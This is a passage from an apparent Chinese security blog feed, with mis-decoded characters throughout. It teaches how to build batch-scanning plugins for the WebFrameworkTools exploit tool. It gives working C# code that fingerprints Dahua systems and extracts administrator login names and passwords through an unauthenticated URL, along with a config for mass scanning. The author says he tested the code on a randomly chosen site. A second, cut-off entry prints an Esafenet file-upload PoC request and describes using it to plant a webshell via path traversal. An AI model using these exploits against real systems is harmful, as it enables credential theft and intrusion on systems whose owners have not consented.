ä¸‹è½½é“¾æ¥:<a href="https://www.upload.ee/files/16111546/WebFrameworkToolsUserIni.zip.html">https://www.upload.ee/files/16111546/WebFrameworkToolsUserIni.zip.html</a><br><br/><br> é…ç½®æ–‡ä»¶æ–‡ä»¶åœ¨é¢‘é“:<a href="https://t.me/SoftwareNoticeChannel/301">https://t.me/SoftwareNoticeChannel/301</a></br></p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»¼åˆæ€§exp|pocæ¸—é€å·¥å…·-WebFrameworkTools5.2 æ–°ç‰ˆç”¨æ³•exp pocç¼–å†™æ•™å­¦</title>
      <link href="/securitytools/2023/09/articles/2633a9b907f3f584/"/>
      <url>/securitytools/2023/09/articles/2633a9b907f3f584/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ­¤å‰æˆ‘ä»¬å‘å¸ƒäº†2022-08-26 ç‰ˆæœ¬è¿™ä¸ªåº”è¯¥ç®—æ˜¯5.0çš„äº§å“ã€‚5.2å’Œå®ƒçš„ä¸åŒç‚¹æˆ‘åœ¨è¿™é‡Œ <a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a> å·²ç»å‘å¸ƒã€‚5.2æœ€å¤§çš„ä¸åŒç‚¹å°±æ˜¯å¯ä»¥è°ƒç”¨ä»»æ„ç¨‹åºæ‰¹é‡æ‰§è¡Œä¸‹é¢æˆ‘é‡ç‚¹è®²è§£ä¸€ä¸‹5.1 å›¾å½¢åŒ–ç”Ÿæˆexpè¿˜æœ‰æ’ä»¶ç¼–å†™å’Œ5.2æ–°ç‰ˆåŠŸèƒ½ã€‚è‡³äºç”¨æ³•å‚è€ƒ17280a163317a771 è¿™ç¯‡å’Œgithubæ¥ä¸‹æ¥åºŸè¯ä¸å¤šè¯´æˆ‘ä»¬æ¥ä»‹ç»ä¸€ä¸‹ã€‚æˆ‘ä»¬ä»¥è¿™é‡Œçš„æ¼æ´<a href="https://github.com/MzzdToT/HAC_Bored_Writing">https://github.com/MzzdToT/HAC_Bored_Writing</a> ä¸¾ä¾‹å­å®æˆ˜æµ‹è¯•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021238636.png" alt="2022-08-26"></p><h2 id="å›¾å½¢åŒ–ç”Ÿæˆexp"><a href="#å›¾å½¢åŒ–ç”Ÿæˆexp" class="headerlink" title="å›¾å½¢åŒ–ç”Ÿæˆexp"></a>å›¾å½¢åŒ–ç”Ÿæˆexp</h2><p>æˆ‘ä»¬æ ¹æ®æç¤ºæœç´¢åˆ°å¦‚ä¸‹expæˆ‘ä»¬ç›´æ¥copyåˆ°æˆ‘ä»¬æœ¬åœ°è¿è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021247731.png" alt="è¿™ä¸ªæ¼æ´ä¸ºåŠ›"><br>copyå‡ºçš„expè¿è¡Œæµ‹è¯•æ²¡æœ‰æŠ¥é”™<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021253414.png" alt="expæˆªå›¾"><br>éšä¾¿æ‰¾ä¸ªç½‘ç«™æµ‹è¯•å‡ºç°ä¸‹é¢çš„å›¾è¯´æ˜å­˜åœ¨æ¼æ´<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021257274.png" alt="å­˜åœ¨æ¼æ´"><br>åˆ†æä¸€ä¸‹è¿™ä¸ªpythonå†™çš„è„šæœ¬æˆ‘ä»¬æ¥æ„é€ expã€‚ä¸‹é¢çš„ä»£ç æ˜¯getè¯·æ±‚è®¿é—®url+&#x2F;admin&#x2F;user_getUserInfoByUserName.action?userName&#x3D;system å¾—åˆ°çš„ç»“æœä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–ç»“æœæˆ‘ä»¬æ¥çœ‹ä¸€æ³¢ã€‚è¿™ä¸ªéœ€è¦ä½ ä»¬ä¼špythonæ‰èƒ½çœ‹æ‡‚å¦‚æœçœ‹ä¸æ‡‚å¯ä»¥å»chatgpté—®ä¸€ä¸‹ä»£ç çš„æ„æ€ã€‚è¿™é‡Œå°±ä¸å¤šè¯´äº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021259758.png" alt="æ ¸å¿ƒexp"><br>é¦–å…ˆè®¿é—®ç›®æ ‡ç½‘ç«™ç¡®å®šå¯ä»¥è®¿é—®ã€‚ç„¶åæˆ‘ä»¬åŠ ä¸Šexpçœ‹çœ‹è¿”å›<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021301334.png" alt="ç›®æ ‡å¯ä»¥è®¿é—®"><br>æˆ‘ä»¬çœ‹åˆ°äº†è¿”å›ç»“æœniceã€‚æ¥ä¸‹æ¥æˆ‘ä»¬æ€ä¹ˆæ„é€ expã€‚æˆ‘ä¸€æ­¥ä¸€æ­¥æ¥ã€‚<br>ç¬¬ä¸€æ­¥:expè®¿é—®ç›®æ ‡ç½‘ç«™<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021304424.png" alt="ç¬¬ä¸€æ­¥"><br>ç¬¬äºŒæ­¥:å¡«å†™ç›®æ ‡ç‰¹å¾(è¿™ä¸ªå¯æœ‰å¯æ— )æœ‰çš„è¯å°±æ˜¯ç²¾ç¡®æ‰“å‡»æ•ˆæœæ˜¾è‘—ã€‚æˆ‘ä»¬å…ˆæ‰¾ä¸ªæ¼æ´ç½‘ç«™çš„é“¾æ¥è®¿é—®å¾—åˆ°æŒ‡çº¹å’Œç‰¹å¾å¦‚ä¸‹å›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021308561.png" alt="å¾—åˆ°æŒ‡çº¹"><br>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å›¾å½¢åŒ–expæ„é€ ä¸€ä¸‹ã€‚æ„é€ æŒ‡çº¹ä»¥ååœ¨è®¿é—®ä¸€æ³¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021312867.png" alt="æŒ‡çº¹æ²¡é—®é¢˜"><br>ç¬¬ä¸‰æ­¥:æå–expã€‚å¡«ä¸ŠåŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²å°±æ²¡é—®é¢˜ã€‚ä½†æ˜¯ç»“æœå¤ªé•¿äº†ã€‚æˆ‘ä»¬ä½¿ç”¨æ­£åˆ™çœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021314799.png" alt="ç»“æœ"><br>æœ€ç»ˆç»“æœå°±æ˜¯è¿™ä¸ªã€‚è½¯ä»¶è¿è¡Œå¾—åˆ°çš„ç»“æœä¹Ÿæ˜¯è¿™ä¸ªã€‚æˆ‘ä»¬æ¥ç”Ÿæˆä¸€ä¸‹expã€‚æ’ä»¶åç§°dahuapass<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021318134.png" alt="å¾—åˆ°æœ€ç»ˆç»“æœ"><br>ç”Ÿæˆåˆ©ç”¨ç¨‹åº<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021319849.png" alt="ç”Ÿæˆåˆ©ç”¨ç¨‹åº"><br>ç¬¬å››æ­¥:æµ‹è¯•ç»“æœã€‚æŠŠè¿™ä¸ªä¸¤ä¸ªdllæ‹·è´å¦‚ä¸‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021321393.png" alt="dllæ‹·è´"><br>ç¬¬äº”æ­¥:è¿›å»dllæ¨¡å¼æµ‹è¯•æ’ä»¶ã€‚å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„ç»“æœå’Œæˆ‘ä»¬å›¾å½¢åŒ–æ„é€ çš„ç»“æœä¸€æ ·ã€‚okå·²ç»å®Œæˆã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021324887.png" alt="ç”Ÿæˆçš„ç»“æœä¸€æ ·"></p><h2 id="expæ’ä»¶ç¼–å†™"><a href="#expæ’ä»¶ç¼–å†™" class="headerlink" title="expæ’ä»¶ç¼–å†™"></a>expæ’ä»¶ç¼–å†™</h2><p>è¿™ä¸ªéœ€è¦ä¼šå˜ç‚¹ç¼–ç¨‹åŠŸåº•æˆ‘ä»¬å»githubä¸‹è½½æˆ‘ä»¬çš„æ’ä»¶é¡¹ç›®ã€‚<br><a href="https://github.com/peiqiF4ck/ToolsUserDllplugin">https://github.com/peiqiF4ck/ToolsUserDllplugin</a>  ä½¿ç”¨vs2022æ‰“å¼€é¡¹ç›®ã€‚æœ‰äººè¯´è¿™ç©æ„æˆ‘ä¸å¤ªä¼šå†™ä»£ç ä½ æ‰¾chatgptæˆ‘å°†æ¼”ç¤ºä¸€ä¸‹å¦‚ä½•å¸®åŠ©æˆ‘ä»¬å†™å‡ºexpã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021330897.png" alt="ä¸‹è½½ä¸‹æ¥æ‰“å¼€é¡¹ç›®"><br>ç¬¬ä¸€æ­¥:è§£å†³å†™å‡ºè¯·æ±‚æ–¹å¼è®©chatgpt ã€‚è¯æœ¯ã€‚è®©ä»–å°è£…æˆå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021332436.png" alt="gpt"><br>è®©ä»–ç”¨.netframeworkæ–¹å¼ç»™æˆ‘ä»¬å†™<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021334148.png" alt="å†™å‡ºæ¥"><br>ä»£ç </p><pre class="language-C#" data-language="C#"><code class="language-C#">public static void Main(string[] args)    &#123;        string url &#x3D; &quot;https:&#x2F;&#x2F;example.com&quot;; &#x2F;&#x2F; æ›¿æ¢ä¸ºä½ è¦è¯·æ±‚çš„URL        string result &#x3D; GetResponse(url, TimeSpan.FromSeconds(30));        Console.WriteLine(result);    &#125;    public static string GetResponse(string url, TimeSpan timeout)    &#123;        string responseText &#x3D; string.Empty;        try        &#123;            HttpWebRequest request &#x3D; (HttpWebRequest)WebRequest.Create(url);            request.Timeout &#x3D; (int)timeout.TotalMilliseconds;            using (HttpWebResponse response &#x3D; (HttpWebResponse)request.GetResponse())            &#123;                using (Stream stream &#x3D; response.GetResponseStream())                &#123;                    using (StreamReader reader &#x3D; new StreamReader(stream))                    &#123;                        responseText &#x3D; reader.ReadToEnd();                    &#125;                &#125;            &#125;        &#125;        catch (Exception ex)        &#123;            responseText &#x3D; $&quot;è¯·æ±‚å‡ºé”™: &#123;ex.Message&#125;&quot;;        &#125;        return responseText;    &#125;</code></pre><p>ç„¶åæˆ‘ä»¬ç›´æ¥copyä»£ç åˆ°é¡¹ç›®é‡Œé¢ã€‚å‘ç°æŠ¥é”™è¿™æ˜¯å› ä¸ºæ²¡æœ‰æ·»åŠ ä¾èµ–ã€‚using System.IO;<br>using System.Net;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021337153.png"><br>æ·»åŠ ä¾èµ–é”™è¯¯æ¶ˆå¤±<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021338870.png"><br>ä¿®æ”¹æˆ‘ä»¬çš„çš„å‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021341860.png"><br>è°ƒç”¨æˆ‘ä»¬çš„å‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021342684.png"><br>æˆ‘ä»¬ä»å‰é¢çŸ¥é“è¦æƒ³ç»“æœå‡†ç¡®éœ€è¦æä¸€ä¸ªæŒ‡çº¹æ‰€ä»¥ä¸‹é¢æ ¼å¼å°±æ˜¯æˆ‘å†™çš„ã€‚ç„¶åå«æœ‰loginnameçš„æ‰æœ‰æ¼æ´æ‰€ä»¥æˆ‘ä»¬çŸ¥é“ç»“æœæ˜¯ã€‚{â€œidâ€:1,â€extIdâ€:1,â€loginNameâ€:â€oooâ€,â€loginPassâ€:â€xxxâ€,â€â€œ} è®©chatgptå¸®æˆ‘ä»¬æå–é‡Œé¢çš„<br>oooå’Œxxx<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021348613.png"></p><p>çœ‹æ“ä½œ:æˆ‘æœ‰ä¸€ä¸ªå­—ç¬¦ä¸² {â€œidâ€:1,â€extIdâ€:1,â€loginNameâ€:â€oooâ€,â€loginPassâ€:â€xxxâ€,â€â€œ}  å¸®æˆ‘å†™ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æå–ä¸‹ä¸€ç»“æœå¾—åˆ°çš„ç»“æœæ˜¯ ooo:xxx ã€‚ç›´æ¥copy<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021352256.png" alt="ç›´æ¥æ‹¿æ"><br>copyæŠ¥é”™åŒæ ·æ˜¯å¯¼å…¥ä¾èµ–ã€‚æŠŠé‚£ä¸ªæœªèƒ½æå–ç»“æœæ”¹æˆ errorã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021353641.png"></p><pre class="language-C#" data-language="C#"><code class="language-C#">public static string ExtractResult(string input)      &#123;          string pattern &#x3D; &quot;\&quot;loginName\&quot;:\&quot;([^\&quot;]+)\&quot;,\&quot;loginPass\&quot;:\&quot;([^\&quot;]+)\&quot;&quot;;          Match match &#x3D; Regex.Match(input, pattern);          if (match.Success)          &#123;              string loginName &#x3D; match.Groups[1].Value;              string loginPass &#x3D; match.Groups[2].Value;              return $&quot;&#123;loginName&#125;:&#123;loginPass&#125;&quot;;          &#125;          else          &#123;              return &quot;error&quot;;          &#125;      &#125;</code></pre><p>æˆ‘ä»¬æ¥ä¸‹æ¥çœ‹æ“ä½œ ç›´æ¥è°ƒç”¨</p><pre class="language-C#" data-language="C#"><code class="language-C#">&#x2F;&#x2F;&#x2F; &lt;summary&gt;     &#x2F;&#x2F;&#x2F; httpæ¼æ´ä»£ç å®ç°       &#x2F;&#x2F;&#x2F; down è¡¨ç¤ºç½‘ç«™æ— æ³•è®¿é—®     &#x2F;&#x2F;&#x2F; error è¡¨ç¤ºæ²¡æœ‰æ¼æ´ è¿”å›error     &#x2F;&#x2F;&#x2F; æˆåŠŸåˆ™è¿”å›ç»“æœ     &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;     &#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;url&quot;&gt;&lt;&#x2F;param&gt;     &#x2F;&#x2F;&#x2F; &lt;returns&gt;&lt;&#x2F;returns&gt;     private  static string thinkphpRce(string url)     &#123;         string result &#x3D; string.Empty;         &#x2F;&#x2F;&#x2F;è°ƒç”¨httpSendMethod å®æˆ˜æ¼æ´é€»è¾‘         &#x2F;&#x2F;&#x2F;         string errorcase &#x3D; &quot;error&quot;;         string expUrl &#x3D; url + &quot;&#x2F;admin&#x2F;user_getUserInfoByUserName.action?userName&#x3D;system&quot;;         string fingerUrl &#x3D; url + &quot;&#x2F;WPMS&#x2F;asset&#x2F;css&#x2F;login.css&quot;;         string res &#x3D; httpSendMethodMy(fingerUrl, 30*1000); &#x2F;&#x2F;è°ƒç”¨httpè¯·æ±‚è¯·æ±‚ç»“æœ         if (!res.Contains(&quot;login-brand&quot;)) &#x2F;&#x2F;æŒ‡çº¹è¯·æ±‚         &#123;             Console.WriteLine(&quot;No å¤§åæ™ºæ…§ product&quot;);             return errorcase;         &#125;         string res1 &#x3D; httpSendMethodMy(expUrl, 30 * 1000); &#x2F;&#x2F;è°ƒç”¨httpè¯·æ±‚è¯·æ±‚ç»“æœ         if (res1.Contains(&quot;loginName&quot;)) &#x2F;&#x2F;         &#123;             &#x2F;&#x2F;é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼æ–¹å¼ç›´æ¥åˆ·é€‰å‡ºæ¼æ´ç„¶åèµ‹å€¼ç»“æœ             string userpass &#x3D; ExtractResult(res1);             if (errorcase.Equals(userpass))             &#123;                 Console.WriteLine(&quot;æ­£åˆ™æå–å¤±è´¥&quot;);                 return errorcase;             &#125;             &#x2F;&#x2F;Console.WriteLine(userpass);             result &#x3D; url + &quot;|&quot; + userpass+ &quot;|ExpName:å¤§åæ¼æ´&quot;;  &#x2F;&#x2F;è¿™é‡Œ |ExpName: æ˜¯å¿…é¡»æ ‡æ³¨çš„ é‡ç‚¹é‡ç‚¹ï¼ï¼ï¼ï¼         &#125;         else         &#123;             result &#x3D; errorcase;         &#125;         return result;     &#125;</code></pre><pre class="language-C#" data-language="C#"><code class="language-C#">public static string DllExec(string url)      &#123; &#x2F;&#x2F;æ–¹æ³•åç§°          string expResult &#x3D; string.Empty;          string errorcase &#x3D; &quot;error&quot;;          string thinkphpRceRes &#x3D; thinkphpRce(url); &#x2F;&#x2F;è°ƒç”¨å‡½æ•°                 if (errorcase.Equals(thinkphpRceRes))          &#123;              expResult &#x3D; errorcase;          &#125;          else          &#123;                         expResult &#x3D; thinkphpRceRes; &#x2F;&#x2F;ç³»ç»Ÿç³»ç»Ÿå†™ç»“æœ              &#x2F;&#x2F;  Console.WriteLine(expResult);             &#x2F;&#x2F; expResult &#x3D; thinkphpRceRes + &quot;|5a75574b96ce583b250cdcfff48caa78|&quot;; &#x2F;&#x2F;ç”¨æˆ·è‡ªå·±å†™æˆåŠŸç»“æœç³»ç»Ÿä¸ç®¡ æ ‡å¿—5a75574b96ce583b250cdcfff48caa78 åŠ ä¸Šè¿™ä¸ªæ ‡å¿—å°±æ˜¯ä½ è‡ªå·±å†™ä½ è‡ªå·±çš„ç»“æœã€‚å°±è¡Œäº†          &#125;          return expResult;      &#125;</code></pre><p>ç„¶åç”Ÿæˆdllæˆ‘ä»¬å¼€å§‹æµ‹è¯•ã€‚ç”Ÿæˆdllåå­—æ”¾åˆ°è½¯ä»¶åŒç›®å½•ä¸‹ã€‚dllåå­—å¯ä»¥ä¿®æ”¹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021425234.png"><br>æµ‹è¯•ç»“æœæ²¡æ¯›ç—…ã€‚è¿™ä¸ªæ¡ˆä¾‹ç¼–å†™æˆ‘ä¼šæ”¾åˆ°é¢‘é“ã€‚è¯·åˆ°é¢‘é“ä¸‹è½½ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021425178.png"></p><h2 id="5-2æ–°åŠŸèƒ½-æ­¤åŠŸèƒ½å±äºæœ€æ–°å¼€å‘"><a href="#5-2æ–°åŠŸèƒ½-æ­¤åŠŸèƒ½å±äºæœ€æ–°å¼€å‘" class="headerlink" title="5.2æ–°åŠŸèƒ½(æ­¤åŠŸèƒ½å±äºæœ€æ–°å¼€å‘)"></a>5.2æ–°åŠŸèƒ½(æ­¤åŠŸèƒ½å±äºæœ€æ–°å¼€å‘)</h2><p>çœ‹äº†ä¸Šé¢çš„ä¸¤ç§ã€‚ç¬¬ä¸€ç§é€‚åˆç®€å•çš„è¯·æ±‚ã€‚ç¬¬äºŒç§å¯ä»¥ ç¼–å†™ä»»æ„exp ä½†æ˜¯è¦æ±‚ä½¿ç”¨è€…ä¼šç‚¹ç¼–ç¨‹é…åˆchatgptçš„ä½¿ç”¨ã€‚å‰ä¸¤ç§åŠŸèƒ½éƒ½æœ‰ç¬¬ä¸‰ç§æœ€æ–°å¼€å‘è¿˜æ²¡æœ‰æ”¾å‡ºã€‚è¿™é‡Œä»‹ç»ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•ã€‚<br>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ç¬¬ä¸‰ç§æ¥æ¼”ç¤ºä¸€ä¸‹ã€‚ä¹‹å‰æˆ‘ä»¬è¯´è¿‡å¾—åˆ°ä¸€ä¸ªè„šæœ¬è¿è¡Œä¸€æ³¢ã€‚é‚£ä¸ªç½‘ç«™æœ‰æ¼æ´ã€‚æ ¼å¼<br>python Dahua_getpass_scan.py -u website<br>é…ç½®æ–‡ä»¶ã€‚æ ¼å¼å¿…é¡»æ˜¯è¿™ç§çš„</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token class-name">WebTools</span><span class="token punctuation">]</span>#è¿™é‡Œå¯ä»¥åœ¨cmdé‡Œé¢æ‰§è¡Œæ— éœ€é…ç½®ç»å¯¹è·¯å¾„å¦åˆ™éœ€é…ç½®ç»å¯¹è·¯å¾„exe<span class="token operator">=</span>python#è¿™é‡Œæ˜¯æ‰§è¡Œè„šæœ¬çš„å‚æ•°arg<span class="token operator">=</span>python\<span class="token class-name">Dahua_getpass_scan</span><span class="token punctuation">.</span>py <span class="token operator">-</span>u $url$#æ¼æ´ç‰¹å¾å­—ç¬¦ä¸²åŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²å°±æœ‰æ¼æ´vulStr<span class="token operator">=</span>is vulnerable#æ­£åˆ™è¡¨è¾¾å¼æå–å­—ç¬¦ä¸²regex<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">&lt;=</span>\<span class="token punctuation">[</span>\<span class="token operator">+</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>*#é…ç½®ä¸è¾“å‡ºç¨‹åºæ‰§è¡Œçš„æ‰€æœ‰ç»“æœåªè¾“å‡ºæ­£åˆ™ç»“æœç­‰echoAllResult<span class="token operator">=</span>no#é…ç½®æ˜¯å¦éœ€è¦æœ¬ç¨‹åºå†™å…¥ç»“æœwriteFile<span class="token operator">=</span>yes#é…ç½®ä¸åŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²æœ‰æ¼æ´æ³¨æ„vulStrå’Œ<span class="token class-name">NovulStr</span>ä¸èƒ½åŒæ—¶å‡ºç°åœ¨åŒä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­#<span class="token class-name">NovulStr</span></code></pre><p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹çœ‹çœ‹ã€‚è¿™ä¸ªç›´æ¥å¯ä»¥æ¼æ´è„šæœ¬å’Œiniæ–‡ä»¶å¯ä»¥åˆ†åˆ«æ”¾ç½®åªéœ€è¦é…ç½®å°±è¡Œäº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021441108.png" alt="5.2æµ‹è¯•æˆªå›¾"><br>æ‰¹é‡å·¥å…·æµ‹è¯•<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021444462.png"></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å„ç§ç”¨æ³•å’Œè½¯ä»¶å…¬å¸ƒæ—¶é—´è§githubã€‚æ¡ˆä¾‹æºä»£ç :<a href="https://t.me/SoftwareNoticeChannel/265">https://t.me/SoftwareNoticeChannel/265</a></p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äº¿èµ›é€š ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ UploadFileFromClientServiceForClient ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´pocè§£æ</title>
      <link href="/codeaudit/2023/09/articles/2d6e04e436b4b308/"/>
      <url>/codeaudit/2023/09/articles/2d6e04e436b4b308/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨å†™hwæ¼æ´expçš„æ—¶å€™åœ¨ä½©çªæ–‡åº“çœ‹åˆ°äº¿èµ›é€šçš„expå¦‚ä¸‹ </p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span><span class="token class-name">CDGServer3</span><span class="token operator">/</span><span class="token class-name">UploadFileFromClientServiceForClient</span><span class="token operator">?</span>AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv<span class="token operator">:</span><span class="token number">109.0</span><span class="token punctuation">)</span> <span class="token class-name">Gecko</span><span class="token operator">/</span><span class="token number">20100101</span> <span class="token class-name">Firefox</span><span class="token operator">/</span><span class="token number">113.0</span><span class="token class-name">Accept</span><span class="token operator">:</span> <span class="token operator">*</span><span class="token comment">/*Content-Length: 1Test</span></code></pre><p>å…¶ä¸­çš„AFMALè¿™ç©æ„çœ‹ç€æ˜¯åŠ å¯†è¿‡å¾—ã€‚äºæ˜¯ä¹æˆ‘é¡ºç€ä¸ªexpæ‹¿ä¸‹äº†webshellç„¶åå¯¹ä»£ç è¿›è¡Œåˆ†æ</p><h2 id="åˆ†æä»£ç "><a href="#åˆ†æä»£ç " class="headerlink" title="åˆ†æä»£ç "></a>åˆ†æä»£ç </h2><p>æ ¹æ®å¤šå¹´çš„ä»£ç å®¡è®¡ç»éªŒå¾—å‡ºä¸‹å›¾ã€‚æœ‰çš„äººè¯´è¿™æ˜¯å’‹æ‰¾åˆ°çš„ã€‚è¿™ç©æ„é¦–å…ˆä½ çš„ä¼šjavaseã€‚å…¶æ¬¡ä½ å¾—ä¼šjavaeeã€‚ç„¶åä½ è¿˜å¾—ä¼šä»£ç å®¡è®¡ã€‚å¦‚æœå±•å¼€è®²ç¯‡å¹…å¤ªé•¿æˆ‘ä»¬é‡ç‚¹å°±åˆ†æä¸‹é¢çš„ä»£ç <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011850935.png" alt="æ¼æ´ç‚¹å®šä½"><br>æ­¤ä»£ç æœ‰ä¸€ä¸ªConstants.EQUAL è¿™ä¸ªæ˜¯ä¸ªå¸¸é‡å°±æ˜¯&#x3D;ç­‰äºå·ã€‚ ä¾‹å¦‚æˆ‘å‘æäº¤<a href="https://www.baidu.com/?username=xxxxxxxxx">https://www.baidu.com?username=xxxxxxxxx</a> ã€‚è¿™å¥è¯çš„æ„æ€å°±æ˜¯è·å– xxxxxxxxxã€‚ä½ çŸ¥é“è¿™ä¸ªå°±è¡Œäº†ã€‚æ‰€ä»¥æˆ‘ä»¬æ„é€ exp çš„æ—¶å€™å¯ä»¥åŠ ä¸Šusernamè¿™äº›å‚æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ç„¶åè°ƒç”¨ CDGUtil.decode() å‡½æ•°è¿›è¡Œè§£ç <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011853393.png" alt="çœ‹ä¸‹é¢çš„ä»£ç "><br>åœ¨å¾€ä¸‹çœ‹è§£å¯†ä»¥åä½¿ç”¨&amp;åˆ†å‰²å¦‚æœæœ‰filenameå¼€å¤´çš„é‚£ä¹ˆè·å–ä»–çš„å€¼ç»§ç»­çœ‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011857516.png" alt="filename"><br>ç„¶åå‘ç°ä½¿ç”¨File file &#x3D; new File(Constant.instance.UPLOAD_PATH + fileName);è¿™ä¸ªå¯¹æ–‡ä»¶è¿›è¡Œä¿å­˜æ²¡æœ‰è¿‡æ»¤ä»»ä½•æ–‡ä»¶åç§°çš„ç‰¹æ®Šå­—ç¬¦å¯¼è‡´æ¼æ´å­˜åœ¨ã€‚è‡³äºè¿™ä¸ªConstant.instance.UPLOAD_PATH æ˜¯ä»€ä¹ˆé»˜è®¤ä¸º C:&#x2F;fileDB&#x2F;uploaded&#x2F; è¿™ä¸ªå¾—é…ç½®ã€‚æˆ‘ä»¬çš„webç›®å½•åœ¨ C:\Program Files (x86)&#x2F;ESAFENET&#x2F;CDocGuard Server&#x2F;tomcat64&#x2F;webapps&#x2F;  æ‰€ä»¥æˆ‘ä»¬å¾—è·³ç›®å½•..&#x2F;..&#x2F;C:&#x2F;Program Files (x86)&#x2F;ESAFENET&#x2F;CDocGuard Server&#x2F;tomcat64&#x2F;webapps&#x2F;  å¦‚æœæ˜¯..&#x2F;..&#x2F;..&#x2F;é‚£ä¹ˆå°±ç›´æ¥çœç•¥ å°±æ˜¯è¿™ç§äº†Program Files (x86)&#x2F;ESAFENET&#x2F;CDocGuard Server&#x2F;tomcat64&#x2F;webapps&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011858699.png" alt="æ¼æ´ç‚¹"></p><h2 id="è§£å¯†expæ„é€ è‡ªå·±çš„poc"><a href="#è§£å¯†expæ„é€ 